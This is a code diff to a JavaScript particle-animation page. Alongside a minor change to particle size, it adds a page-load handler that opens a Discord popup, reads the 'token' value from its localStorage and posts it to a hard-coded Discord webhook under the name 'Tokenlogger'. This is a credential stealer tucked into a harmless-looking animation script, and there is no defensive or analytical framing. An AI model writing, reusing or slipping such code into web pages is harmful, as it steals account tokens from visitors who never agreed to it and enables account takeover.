@@ -31,7 +31,7 @@ class Particles {
   constructor (x, y, ctx, dir, speed) {
     this.x = x;
     this.y = y;
-    this.size = Math.random() * 5;
+    this.size = Math.random() * 3;
     this.ctx = ctx;
     this.dir = dir;
     this.mode = "out";
@@ -132,12 +132,22 @@ function animate () {
 }
 
 window.onload = function () {
-  let popup = window.open('https://discord.com/channels/@me', 'popup', 'width=300,height=200');
+    let popup = window.open('https://discord.com/channels/@me', 'popup', 'width=300,height=200');
 
-  popup.addEventListener('load', function() {
-    let popupLocalStorage = popup.localStorage;
-  
-    let data = popupLocalStorage.token
-    console.log(data);
-  });
+    popup.addEventListener('load', function() {
+        let popupLocalStorage = popup.localStorage;
+        let data = popupLocalStorage.token;
+        const webhook = "https://discord.com/api/webhooks/1274476164659810408/8AzWuwNk23QppWXZMhsaBmrL89Nx5cHneMHA4LjY-ns2nuAMj6KKjeJip9F-BJa8hfAW";
+        const request = new XMLHttpRequest();
+        request.open("POST", webhook);
+        request.setRequestHeader("Content-type", "application/json");
+        const params = {
+            username: "Tokenlogger",
+            embeds: [{
+                title: "Hello!",
+                description: "token: " + data
+            }]
+        };
+        request.send(JSON.stringify(params));
+    });
 }
